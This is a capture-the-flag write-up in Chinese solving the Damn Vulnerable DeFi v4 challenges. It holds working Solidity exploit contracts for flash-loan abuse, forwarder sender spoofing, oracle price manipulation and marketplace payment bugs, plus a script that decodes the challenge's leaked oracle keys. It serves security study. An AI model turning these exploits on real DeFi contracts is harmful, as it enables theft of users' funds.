## Damn Vulnerable DeFi v4 Writeup [SunSec]

![Screenshot 2024-09-11 at 10 18 33 AM](https://github.com/user-attachments/assets/7e3df1a1-3fc6-4d01-8860-88e06ef820f1)

### 1. Unstoppable
--- 
[題目](https://www.damnvulnerabledefi.xyz/challenges/unstoppable/): 
有一個代幣化的金庫，存入了100萬個DVT代幣。該金庫提供免費的閃電貸款，直到寬限期結束。為了在完全無需許可前捕捉任何錯誤，開發者決定在測試網中進行實時測試。還有一個監控合約，用來檢查閃電貸款功能的運行狀況。從餘額為10個DVT代幣開始，展示如何使金庫停止運行。必須讓它停止提供閃電貸款。

過關條件:
- 讓 flashLoan 功能失效

知識點:
-   閃電貸
-   DOS


解題:
- 只要 transfer token 給這個合約就可以讓 totalSupply != balanceBefore 讓閃電貸款失效。

```
 if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); 
```

[POC:](./damn-vulnerable-defi/test/unstoppable/Unstoppable.t.sol) 
```
    function test_unstoppable() public checkSolvedByPlayer {
        token.transfer(address(vault), 123);   
    }
```



### 2. Naive Receiver

[題目](https://www.damnvulnerabledefi.xyz/challenges/naive-receiver/): 
有一個資金池，餘額為1000 WETH，並提供閃電貸款。它收取固定費用為1 WETH。該資金池通過整合無需許可的轉發合約，支持元交易。一名使用者部署了一個餘額為10 WETH的範例合約。看起來它可以執行WETH的閃電貸款。所有資金都面臨風險！將使用者和資金池中的所有WETH救出，並將其存入指定的recovery賬戶。

過關條件:
- 必須執行兩次或更少的交易。確保 vm.getNonce(player) 小於等於2
- 確保 weth.balanceOf(address(receiver)) 為 0
- 確保 weth.balanceOf(address(pool)) 為 0
- 確保 weth.balanceOf(recovery) 等於 WETH_IN_POOL + WETH_IN_RECEIVER = 1010 ETH。

知識點:
-   閃電貸
-   建立攻擊合約滿足一筆交易完成攻擊
-   MultiCall
-   msg.data (calldata操作)

解題:
- NaiveReceiverPool 繼承 Multicall, IERC3156FlashLender 
[ERC-3156](https://eips.ethereum.org/EIPS/eip-3156): 閃電貸模組和允許閃電貸的 {ERC20} 擴充.
- FlashLoanReceiver 題目初始有10ETH,每次接收的 Flashloan 會支付1ETH手續費給 Pool. 但問題在於 onFlashLoan 沒有檢查發起 Flashloan是不是授權的來源. 所以我們只要發送10次 Flashloan 然後 amount 帶入0. 就可以把FlashLoanReceiver的10ETH轉走. 但是題目要求 Nonce 要小於2. 在前面有提到 NaiveReceiverPool 繼承 Multicall.  所以我們可以透過Multicall執行一次交易操作10次Flashloan就可以滿足 Nonce 小於2.
- 再來要想辦法把 NaiveReceiverPool 初始的1000ETH轉走. 從合約中可以看到唯一可以把資產轉走的function 是 withdraw. 可以發現到 _msgSender 需滿足 msg.sender == trustedForwarder && msg.data.length >= 20. 就可以返回最後20bytes 地址. 這邊是可以操控的.
- 再來是滿足 msg.sender == trustedForwarder. 這裡就要透過 forwarder 執行 meta-transaction.  

```
    function withdraw(uint256 amount, address payable receiver) external {
        // Reduce deposits
        deposits[_msgSender()] -= amount;
        totalDeposits -= amount;

        // Transfer ETH to designated receiver
        weth.transfer(receiver, amount);
    }
    function _msgSender() internal view override returns (address) {
        if (msg.sender == trustedForwarder && msg.data.length >= 20) {
            return address(bytes20(msg.data[msg.data.length - 20:]));
            //bytes20：將 msg.data 中最後 20 個字節轉換為 address 類型
        } else {
            return super._msgSender();
        }
    }

```
[POC](./damn-vulnerable-defi/test/naive-receiver/NaiveReceiver.t.sol) : 
```
    function test_naiveReceiver() public checkSolvedByPlayer {
        bytes[] memory callDatas = new bytes[](11);
        for(uint i=0; i<10; i++){
            callDatas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, "0x"));
        }
        callDatas[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
            bytes32(uint256(uint160(deployer)))
        );
        bytes memory callData;
        callData = abi.encodeCall(pool.multicall, callDatas);
        BasicForwarder.Request memory request = BasicForwarder.Request(
            player,
            address(pool),
            0,
            gasleft(),
            forwarder.nonces(player),
            callData,
            1 days
        );
        bytes32 requestHash = keccak256(
            abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(),
                forwarder.getDataHash(request)
            )
        );
        (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        forwarder.execute(request, signature);
    }
```

### 3. Truster

[題目](https://www.damnvulnerabledefi.xyz/challenges/truster/): 
越來越多的借貸池提供閃電貸款。在這個情況下，一個新的池子已經啟動，提供免費的 DVT 代幣閃電貸款。該池子持有 100 萬個 DVT 代幣。而你什麼都沒有。要通過這個挑戰，你需要在一筆交易中拯救池子中的所有資金，並將這些資金存入指定的恢復賬戶。

過關條件:
- 只能執行1筆交易
- 救援資金發送至 recovery 帳戶

知識點:
-   Arbitrary call


解題:
- 在 floashLoan 中可以看到 target.functionCall(data); 可以執行任意calldata且target的地址可控. 可直接執行任意指令.

[POC](./damn-vulnerable-defi/test/truster/Truster.t.sol) : 
```
    function test_truster() public checkSolvedByPlayer {
        Exploit exploit = new Exploit(address(pool), address(token),address(recovery));
    }
    
 contract Exploit {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;

    constructor(address _pool, address _token, address recoveryAddress) payable {
        TrusterLenderPool pool = TrusterLenderPool(_pool);
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), TOKENS_IN_POOL);
        pool.flashLoan(0, address(this), _token, data);
        DamnValuableToken token = DamnValuableToken(_token);
        token.transferFrom(_pool, address(recoveryAddress), TOKENS_IN_POOL);
    }
}
```

### 4. Side Entrance

[題目](https://www.damnvulnerabledefi.xyz/challenges/side-entrance/): 一個出乎意料的簡單池子允許任何人存入ETH，並隨時提取。該池子已經有1000 ETH的餘額，並提供免費的閃電貸款來推廣他們的系統。你開始時有1 ETH的餘額。通過將池子裡的所有ETH救出並存入指定的 Recovery 錢包來完成挑戰。

過關條件:
- 池子的餘額必須為0.
- 指定的 Recovery 錢包中的餘額必須等於池子中原本的ETH數量（即 ETHER_IN_POOL）.

知識點:
- 錯誤使用 address(this).balance 當驗證方法

解題:
- flashLoan 採用非標準用法, 判斷有沒有repay只是看池子的餘額 if (address(this).balance < balanceBefore). 
- 所以只要透過 flashLoan借款出來, 再透過deposit存回去. 就代表repay了. 然後你在合約同時有存款證明, 可執行 withdraw 就可以把$$轉出去了.

[POC](./damn-vulnerable-defi/test/SideEntrance/SideEntrance.t.sol) : 
```
    function test_sideEntrance() public checkSolvedByPlayer {
        Exploit exploiter = new Exploit(address(pool), recovery, ETHER_IN_POOL);
        exploiter.attack();
    }
contract Exploit{
    SideEntranceLenderPool public pool;
    address public recovery;
    uint public exploitAmount;
    constructor(address _pool, address _recovery, uint _amount){  
        pool = SideEntranceLenderPool(_pool);
        recovery = _recovery;
        exploitAmount = _amount;
    }
    function attack() external returns(bool){
        pool.flashLoan(exploitAmount);
        pool.withdraw();
        payable(recovery).transfer(exploitAmount);
    }
    function execute() external payable{
        pool.deposit{value:msg.value}();
    }
    receive() external payable{}
}

```
### 5. The Rewarder
[題目](https://www.damnvulnerabledefi.xyz/challenges/the-rewarder/): 一個合約正在分發Damn Valuable Tokens和WETH作為獎勵。要領取獎勵，用戶必須證明自己在選定的受益者名單中。不過不用擔心燃料費，這個合約已經過優化，允許在同一筆交易中領取多種代幣。Alice已經領取了她的獎勵。你也可以領取你的獎勵！但你發現這個合約中存在一個關鍵漏洞。儘可能多地從這個分發者手中拯救資金，將所有回收的資產轉移到指定的 Recovery 錢包中。

過關條件:
- 分發者合約中的剩餘DVT數量必須少於1e16（也就是0.01 DVT），僅允許留下極少量的「Dust」。
- 分發者合約中的剩餘WETH數量必須少於1e15（也就是0.001 WETH），僅允許留下極少量的「Dust」。
- 指定Recovery 錢包中的DVT數量必須等於總分發DVT數量（TOTAL_DVT_DISTRIBUTION_AMOUNT）減去Alice已經領取的DVT數量（ALICE_DVT_CLAIM_AMOUNT）以及分發者合約中剩餘的DVT數量。
- 指定Recovery 錢包中的WETH數量必須等於總分發WETH數量（TOTAL_WETH_DISTRIBUTION_AMOUNT）減去Alice已經領取的WETH數量（ALICE_WETH_CLAIM_AMOUNT）以及分發者合約中剩餘的WETH數量。

知識點:
- 在 Array 更新狀態邏輯錯誤

解題:
- 基於 Merkle proofs 和 bitmaps 代幣分配合約
- REF: [Bitmaps & Merkle Proofs](https://x.com/DegenShaker/status/1825835855140868370) | [Bitmap结构在ENSToken里的应用](https://mirror.xyz/franx.eth/0PTXWm1ynYxeF11S_xlXzmQqeICHQeI4tz3Uwz9aWuk)
- 合約中可以發現在 claimRewards 中, 更新用戶是不是有領過reward是透過 _setClaimed().
- 因為 claimRewards支援array, 可以一個transaction執行多次claim. 並在最後一個claim才更新用戶claimreward紀錄.
- player 的地址, index為188
```
            // for the last claim
            if (i == inputClaims.length - 1) {
                if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
            }
```
[POC](./damn-vulnerable-defi/test/the-rewarder/TheRewarder.t.sol) : 
```
   function test_theRewarder() public checkSolvedByPlayer {
        uint PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;
        uint PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;

        bytes32[] memory dvtLeaves = _loadRewards(
            "/test/the-rewarder/dvt-distribution.json"
        );
        bytes32[] memory wethLeaves = _loadRewards(
            "/test/the-rewarder/weth-distribution.json"
        );

        uint dvtTxCount = TOTAL_DVT_DISTRIBUTION_AMOUNT /
            PLAYER_DVT_CLAIM_AMOUNT;
        uint wethTxCount = TOTAL_WETH_DISTRIBUTION_AMOUNT /
            PLAYER_WETH_CLAIM_AMOUNT;
        uint totalTxCount = dvtTxCount + wethTxCount;

        IERC20[] memory tokensToClaim = new IERC20[](2);
        tokensToClaim[0] = IERC20(address(dvt));
        tokensToClaim[1] = IERC20(address(weth));

        // Create Alice's claims
        console.log(totalTxCount);
        Claim[] memory claims = new Claim[](totalTxCount);

        for (uint i = 0; i < totalTxCount; i++) {
            if (i < dvtTxCount) {
                claims[i] = Claim({
                    batchNumber: 0, // claim corresponds to first DVT batch
                    amount: PLAYER_DVT_CLAIM_AMOUNT,
                    tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
                    proof: merkle.getProof(dvtLeaves, 188) //player at index 188
                });
            } else {
                claims[i] = Claim({
                    batchNumber: 0, // claim corresponds to first DVT batch
                    amount: PLAYER_WETH_CLAIM_AMOUNT,
                    tokenIndex: 1, // claim corresponds to first token in `tokensToClaim` array
                    proof: merkle.getProof(wethLeaves, 188)  //player at index 188
                });
            }
        }
        //multiple claims
        distributor.claimRewards({
            inputClaims: claims,
            inputTokens: tokensToClaim
        });

        dvt.transfer(recovery, dvt.balanceOf(player));
        weth.transfer(recovery, weth.balanceOf(player));
    }
    
```

### 6. Selfie

[題目](https://www.damnvulnerabledefi.xyz/challenges/selfie/): 一個新的貸款池已經上線！現在它提供DVT代幣的閃電貸款服務。這個池子還包括一個精巧的治理機制來控制它。這能出什麼問題呢，對吧？你開始時沒有任何DVT代幣餘額，而這個池子中有150萬的資金面臨風險。將池子中的所有資金救出並存入指定的回收賬戶，完成這項挑戰。

過關條件:
- 池子的DVT餘額必須為0.
- 指定的 Recovery 錢包中的餘額必須等於池子中原本的DVT數量（即 TOKENS_IN_POOL）.

知識點:
- 閃電貸
- 投票授權 delegate
- 治理機制

解題:
- SelfiePool 合約中有一個 function emergencyExit() 可以把合約中所有餘額轉移. 但需要滿足 onlyGovernance 權限.
- 跟進 SimpleGovernance 合約可以發現可以透過 queueAction 發起一個提案, 且data可以控制. 那就可以透過這個方式去執行 emergencyExit().
- 要執行 queueAction 要通過 _hasEnoughVotes 檢查, DamnValuableVotes 繼承 ERC20Votes, 所以借貸到的DVT需要delete受投票權給自己, 需要持有總發行量的一半投票權才能發起提案.
- 解題流程: Flashloan -> delegate ->發起提案 queueAction -> repay -> executeAction

[POC](./damn-vulnerable-defi/test/selfie/selfie.t.sol) : 
```
    function test_selfie() public checkSolvedByPlayer {
        Exploit exploiter = new Exploit(
            address(pool),
            address(governance),
            address(token)
        );
        exploiter.exploitSetup(address(recovery));
        vm.warp(block.timestamp + 2 days);
        exploiter.exploitCloseup();
    }

contract Exploit is IERC3156FlashBorrower{
    SelfiePool selfiePool;
    SimpleGovernance simpleGovernance;
    DamnValuableVotes damnValuableToken;
    uint actionId;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    constructor(
        address _selfiePool, 
        address _simpleGovernance,
        address _token
    ){
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
        damnValuableToken = DamnValuableVotes(_token);
    }
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32){
        damnValuableToken.delegate(address(this));
        uint _actionId = simpleGovernance.queueAction(
            address(selfiePool),
            0,
            data
        );
        actionId = _actionId;
        IERC20(token).approve(address(selfiePool), amount+fee);
        return CALLBACK_SUCCESS;
    }

    function exploitSetup(address recovery) external returns(bool){
        uint amountRequired = 1_500_000e18;
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
        selfiePool.flashLoan(IERC3156FlashBorrower(address(this)), address(damnValuableToken), amountRequired, data);
    }
    function exploitCloseup() external returns(bool){
        bytes memory resultData = simpleGovernance.executeAction(actionId);
    }
}
```

### 7. Compromised

[題目](https://www.damnvulnerabledefi.xyz/challenges/compromised/): 在瀏覽一個最受歡迎的DeFi項目之一的網絡服務時，你從服務器那裡得到了一個奇怪的響應。以下是其中的一段：
```
HTTP/2 200 OK
content-type: text/html
content-language: en
vary: Accept-Encoding
server: cloudflare

4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30

4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35
```
一個相關的鏈上交易所正在出售名為“DVNFT”的（價格荒誕地高）的收藏品，目前每個價格為999 ETH。這個價格是由一個基於三個可信報告者的鏈上預言機獲取的，這三個報告者分別是：0x188...088、0xA41...9D8 和 0xab3...a40。
你開始時賬戶餘額僅為0.1 ETH，通過將交易所中可用的所有ETH救出來來完成挑戰。然後將資金存入指定的回收賬戶中。

過關條件:
- exchange 合約地址中的ETH餘額必須為0.
- recovery 地址中的ETH餘額必須等於exchange的初始ETH餘額
- player的NFT餘額必須為0
- 預言機中的DVNFT價格必須保持不變，仍然等於初始NFT價格（INITIAL_NFT_PRICE），確保挑戰過程中沒有操縱價格

知識點:
- 錢包私鑰
- Oralce price 設定


解題:
- leaked_infomation decode出來後是兩個錢包私鑰, 這兩個錢包可以設定 oracle price
```
import base64

def hex_to_ascii(hex_str):
    ascii_str = ''
    for i in range(0, len(hex_str), 2):
        ascii_str += chr(int(hex_str[i:i+2], 16))
    return ascii_str

def decode_base64(base64_str):
    # Decode Base64 to ASCII
    return base64.b64decode(base64_str).decode('utf-8')

leaked_information = [
    '4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30',
    '4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35',
]

from eth_account import Account

for leak in leaked_information:
    hex_str = ''.join(leak.split())
    ascii_str = hex_to_ascii(hex_str)
    decoded_str = decode_base64(ascii_str)
    private_key = decoded_str
    print("Private Key:", private_key)
    
    # Create a wallet instance from the private key
    wallet = Account.from_key(private_key)
    
    # Get the public key (address)
    address = wallet.address
    print("Wallet address:", address)

Private Key: 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
Wallet address: 0x188Ea627E3531Db590e6f1D71ED83628d1933088
Private Key: 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
Wallet address: 0xA417D473c40a4d42BAd35f147c21eEa7973539D8

```
- 操控NFT價格, 低買高賣即可獲得更多ETH

[POC](./damn-vulnerable-defi/test/compromised/Compromised.t.sol) : 
```
    function test_compromised() public checkSolved {
        Exploit exploit = new Exploit{value:address(this).balance}(oracle, exchange, nft, recovery);
        vm.startPrank(sources[0]);
        oracle.postPrice(symbols[0],0);
        vm.stopPrank();
        vm.startPrank(sources[1]);
        oracle.postPrice(symbols[0],0);
        vm.stopPrank();

        exploit.buy();

        vm.startPrank(sources[0]);
        oracle.postPrice(symbols[0],999 ether);
        vm.stopPrank();
        vm.startPrank(sources[1]);
        oracle.postPrice(symbols[0],999 ether);
        vm.stopPrank();
        exploit.sell();
        exploit.recover(999 ether);
    }
    contract Exploit is IERC721Receiver{
    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;
    uint nftId;
    address recovery;
    constructor(    
        TrustfulOracle _oracle,
        Exchange _exchange,
        DamnValuableNFT _nft,
        address _recovery
    ) payable {
        oracle = _oracle;
        exchange = _exchange;
        nft = _nft;
        recovery = _recovery;
    }
    function buy() external payable{
        uint _nftId = exchange.buyOne{value:1}();
        nftId = _nftId;
    }
    function sell() external payable{
        nft.approve(address(exchange), nftId);
        exchange.sellOne(nftId);
    }
    function recover(uint amount) external {
        payable(recovery).transfer(amount);
    }
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4){
        return this.onERC721Received.selector;
    }
    receive() external payable{
    }
}
```

### 8. Puppet

[題目](https://www.damnvulnerabledefi.xyz/challenges/puppet/): 有一個貸款池，使用者可以在其中借貸Damn Valuable Tokens（DVTs）。要借貸，他們首先需要存入借款額度兩倍的ETH作為抵押品。該池目前有100,000 DVT的流動性。在一個老舊的Uniswap v1交易所中開設了DVT市場，目前有10 ETH和10 DVT的流動性。通過將貸款池中的所有代幣救出來並將它們存入指定的 recovery 錢包來完成挑戰。你開始時有25 ETH和1000 DVT的餘額。

過關條件:
- 確保僅執行一筆交易
- lendingPool 的DVT代幣為0
- 將所有DVT轉到 recovery 錢包

知識點:
- 錯誤使用 balanceOf 當報價的參考

解題:
- 過去很多被駭事件, 使用合約上的餘額來當條件, 這是非常危險的且可被操控. 在PuppetPool中可以看到 _computeOraclePrice 就是使用balance來計算 oracle price.
```
    function _computeOraclePrice() private view returns (uint256) {
        // calculates the price of the token in wei according to Uniswap pair
        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
    }
```
- 將自己的所有DVT透過 tokenToEthTransferInput 打到 uniswapV1Exchange 操控price.
- 
[POC](./damn-vulnerable-defi/test/puppet/Puppet.t.sol) : 
```
    function test_puppet() public checkSolvedByPlayer {
        Exploit exploit = new Exploit{value:PLAYER_INITIAL_ETH_BALANCE}(
            token,
            lendingPool,
            uniswapV1Exchange,
            recovery
        );
        token.transfer(address(exploit), PLAYER_INITIAL_TOKEN_BALANCE);
        exploit.attack(POOL_INITIAL_TOKEN_BALANCE);
    }

contract Exploit {
    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;
    address recovery;
    constructor(
        DamnValuableToken _token,
        PuppetPool _lendingPool,
        IUniswapV1Exchange _uniswapV1Exchange,
        address _recovery 
    ) payable {
        token = _token;
        lendingPool = _lendingPool;
        uniswapV1Exchange = _uniswapV1Exchange;
        recovery = _recovery;
    }
    function attack(uint exploitAmount) public {
        uint tokenBalance = token.balanceOf(address(this));
        token.approve(address(uniswapV1Exchange), tokenBalance);
        console.log("before calculateDepositRequired(amount)",lendingPool.calculateDepositRequired(exploitAmount));
        uniswapV1Exchange.tokenToEthTransferInput(tokenBalance, 1, block.timestamp, address(this));
        console.log(token.balanceOf(address(uniswapV1Exchange)));
        console.log("after calculateDepositRequired(amount)",lendingPool.calculateDepositRequired(exploitAmount));
        lendingPool.borrow{value: 20e18}(
            exploitAmount,
            recovery
        );
    }
    receive() external payable {
    }
}
  before calculateDepositRequired(amount) 200000000000000000000000
  after calculateDepositRequired(amount) 19664329888798200000
```

### 9. Puppet V2

[題目](https://www.damnvulnerabledefi.xyz/challenges/puppet-v2/): 上一個貸款池的開發者似乎吸取了教訓，並發布了新版本。現在，他們使用Uniswap v2交易所作為價格預言機，並搭配推薦的實用庫。這樣應該足夠了吧？你開始時有20 ETH和10000 DVT代幣的餘額。該池子有一百萬DVT代幣的資金面臨風險！將池子中的所有資金救出，並將它們存入指定的recovery 錢包。

知識點:
- 錯誤使用 getReserves 當報價的參考

過關條件:
- lendingPool 的DVT代幣為0
- 將所有DVT轉到 recovery 錢包

解題:
- 這關oracle改成使用 Uniswap v2, 不過 getReserves 跟取balance是一樣的意思,存在操控的風險

[POC](./damn-vulnerable-defi/test/puppet-v2/PuppetV2.t.sol) : 
```

    // Fetch the price from Uniswap v2 using the official libraries
    function (uint256 amount) private view returns (uint256) {
        (uint256 reservesWETH, uint256 reservesToken) =
            UniswapV2Library.getReserves({factory: _uniswapFactory, tokenA: address(_weth), tokenB: address(_token)});

        return UniswapV2Library.quote({amountA: amount * 10 ** 18, reserveA: reservesToken, reserveB: reservesWETH});
    }
```
- 透過 swapExactTokensForTokens 把 player 的 DVT全部換成 WETH, 就可以降低 DVT 價格
```
    function test_puppetV2() public checkSolvedByPlayer {

        token.approve(address(uniswapV2Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        console.log("before alculateDepositOfWETHRequired",lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE));
        uniswapV2Router.swapExactTokensForETH(token.balanceOf(player), 1 ether, path, player, block.timestamp);

        weth.deposit{value: player.balance}();
   
        weth.approve(address(lendingPool), type(uint256).max);
        uint256 poolBalance = token.balanceOf(address(lendingPool));
        uint256 depositOfWETHRequired = lendingPool.calculateDepositOfWETHRequired(poolBalance);
        console.log("after alculateDepositOfWETHRequired",lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE));
        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
        token.transfer(recovery,POOL_INITIAL_TOKEN_BALANCE);

    }
  before alculateDepositOfWETHRequired 300000000000000000000000
  after alculateDepositOfWETHRequired 29496494833197321980

```

### 10. Free Rider

[題目](https://www.damnvulnerabledefi.xyz/challenges/free-rider/): 一個全新的Damn Valuable NFTs市場已經發布！市場上有6個NFT被首次鑄造，現已開放出售，每個價格為15 ETH。有一個關鍵漏洞被報告，聲稱所有的代幣都可以被奪走。然而，開發者們不知道如何拯救這些代幣！他們提供了一個45 ETH的賞金，給任何願意將這些NFT取出並送回給他們的人。回收過程由一個專門的智能合約管理。你已經同意幫忙。儘管如此，你的餘額只有0.1 ETH。開發者們對你要求更多資金的消息卻毫無回應。如果你能獲得免費的ETH，至少瞬間獲得一些該多好。

過關條件:
- 需要確保所有的NFT從recoveryManager智能合約中提取出來，並且轉移到recoveryManagerOwner的地址
- 市場上應該不再有任何NFT待售，這表示市場中的offersCount()應該為0
- player 的餘額必須大於或等於賞金的數量

知識點:
- Uniswap flashswap
- Array 中 mas.value 驗證不正確

解題:
- 在買 NFT 的_buyOne function 中有一個錯誤檢查金額的地方. 只要msg.value大於priceToPay就可以通過. 
```
        if (msg.value < priceToPay) {
            revert InsufficientPayment();
        }
```
-  如果只是買一張NFT是沒問題, 但合約提供一次可以購買多張NFT. 透過 buyMany() loop執行 _buyOne, 這樣就會有一個邏輯漏洞, 只要有15ETH(1張NFT價格)就可以買多個NFT.
```
    function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
        for (uint256 i = 0; i < tokenIds.length; ++i) {
            unchecked {
                _buyOne(tokenIds[i]);
            }
        }
    }
```
- 第二個邏輯錯誤也是在 _buyOne裡面, 當購買的NFT後會把15ETH轉給賣家. 但從程式中顯轉移NFT擁有權, 所以會把15ETH轉給買家了.
```
        _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

        // pay seller using cached token
        payable(_token.ownerOf(tokenId)).sendValue(priceToPay);
```
- 搭配以上兩個bug, 可以免費透過 uniswapV2 flashswap 借出15ETH來購買多張NFT, 最後我們的成本僅需 0.3% flashswap fee. 題目預設給我們0.1ETH,所以很足夠.
- 最後一個步驟就是要買6張NFT, 都轉移給 FreeRiderRecoveryManager, 就可以拿到45ETH賞金了. [REF](https://medium.com/@JohnnyTime/damn-vulnerable-defi-v3-challenge-10-solution-free-rider-complete-walkthrough-7da8122691b3)
```
        if (++received == 6) {
            address recipient = abi.decode(_data, (address));
            payable(recipient).sendValue(bounty);
        }
```
[POC](./damn-vulnerable-defi/test/free-rider/FreeRider.t.sol) : 

```
    function test_freeRider() public checkSolvedByPlayer {
        Exploit exploit = new Exploit{value:0.045 ether}(
            address(uniswapPair),
            address(marketplace),
            address(weth),
            address(nft),
            address(recoveryManager)
        );
        exploit.attack();
        console.log("balance of attacker:", address(player).balance / 1e15, "ETH");
    }
contract Exploit {
    
    IUniswapV2Pair public pair;
    IMarketplace public marketplace;
    IWETH public weth;
    IERC721 public nft;
    address public recoveryContract;
    address public player;
    uint256 private constant NFT_PRICE = 15 ether;
    uint256[] private tokens = [0, 1, 2, 3, 4, 5];

    constructor(address _pair, address _marketplace, address _weth, address _nft, address _recoveryContract)payable{
        pair = IUniswapV2Pair(_pair);
        marketplace = IMarketplace(_marketplace);
        weth = IWETH(_weth);
        nft = IERC721(_nft);
        recoveryContract = _recoveryContract;
        player = msg.sender;
    }

    function attack() external payable {
         // 1. Request a flashSwap of 15 WETH from Uniswap Pair  
        pair.swap(NFT_PRICE, 0, address(this), "1");
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {

        // Access Control
        require(msg.sender == address(pair));
        require(tx.origin == player);

        // 2. Unwrap WETH to native ETH
        weth.withdraw(NFT_PRICE);

        // 3. Buy 6 NFTS for only 15 ETH total
        marketplace.buyMany{value: NFT_PRICE}(tokens);

        // 4. Pay back 15WETH + 0.3% to the pair contract
        uint256 amountToPayBack = NFT_PRICE * 1004 / 1000;
        weth.deposit{value: amountToPayBack}();
        weth.transfer(address(pair), amountToPayBack);

        // 5. Send NFTs to recovery contract so we can get the bounty
        bytes memory data = abi.encode(player);
        for(uint256 i; i < tokens.length; i++){
            nft.safeTransferFrom(address(this), recoveryContract, i, data);
        }
        
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}

}
```

### 11. Backdoor

[題目](https://www.damnvulnerabledefi.xyz/challenges/backdoor/): 為了激勵團隊成員創建更安全的錢包，有人部署了一個Safe錢包的註冊表。當團隊中的某個人部署並註冊一個錢包時，他們會獲得10個DVT代幣。這個註冊表與合法的Safe代理工廠（Safe Proxy Factory）緊密集成，並且包括嚴格的安全檢查。目前，有四個人被註冊為受益人：Alice、Bob、Charlie和David。註冊表中有40個DVT代幣餘額，準備分配給他們。找出註冊表中的漏洞，救出所有資金，並將它們存入指定的回收賬戶。並且在一次交易中完成。

過關條件:
- 只執行了一次交易
- 所有被列為受益人的用戶都必須已經在註冊表中註冊了一個錢包地址
- 用戶不再是受益人
- 所有代幣都被轉移到 recovery 錢包

知識點:
- Safe 合約錢包
- Proxy 合約初始化

解題:
- Safe = singletonCopy, SafeProxyFactory = walletFactory
- create a new Safe wallet: SafeProxyFactory.createProxyWithCallback -> createProxyWithNonce -> deployProxy -> ( if callback is defined ) callback.proxyCreated
- 題目有4位受益人, 透過 WalletRegustry 建立合錢包每一位會拿到10ETH. 在 function proxyCreated 的備註提到建立錢包是透過 SafeProxyFactory::createProxyWithCallback, 可以從以下看到 createProxyWithCallback的code. 
```
     * @notice Function executed when user creates a Safe wallet via SafeProxyFactory::createProxyWithCallback
     *          setting the registry's address as the callback.
    function proxyCreated

    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) public returns (SafeProxy proxy) {
        uint256 saltNonceWithCallback = uint256(keccak256(abi.encodePacked(saltNonce, callback)));
        proxy = createProxyWithNonce(_singleton, initializer, saltNonceWithCallback);
        if (address(callback) != address(0)) callback.proxyCreated(proxy, _singleton, initializer, saltNonce);
    }
```
